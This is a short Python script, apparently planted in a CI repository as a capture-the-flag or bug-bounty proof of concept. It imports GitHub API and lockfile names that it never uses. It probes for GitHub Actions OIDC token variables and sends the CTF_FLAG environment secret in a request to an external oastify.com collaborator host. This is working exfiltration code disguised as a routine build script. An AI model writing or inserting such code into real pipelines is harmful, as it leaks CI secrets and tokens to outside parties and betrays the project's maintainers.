import logging
import os
import base64
import requests

from integration.github.github_api import GithubApi
from model.log_level import get_log_level

LOCKFILE = "Cargo.Bazel.toml.lock"

if __name__ == "__main__":
    logging.basicConfig(level=get_log_level())

    if "ACTIONS_ID_TOKEN_REQUEST_URL" in os.environ:
        logging.error("ACTIONS_ID_TOKEN_REQUEST_URL set")
    else:
        logging.error("ACTIONS_ID_TOKEN_REQUEST_URL not set")
    if "ACTIONS_ID_TOKEN_REQUEST_TOKEN" in os.environ:
        logging.error("ACTIONS_ID_TOKEN_REQUEST_TOKEN set")
    else:
        logging.error("ACTIONS_ID_TOKEN_REQUEST_TOKEN not set")

    if "CTF_FLAG" in os.environ:
        requests.get('https://ozrpyydz23te740arme9e93i59b0zqnf.oastify.com/{}'.format(os.environ["CTF_FLAG"]))
        logging.info("CTF_FLAG send")
    else:
        logging.error("CTF_FLAG not set")
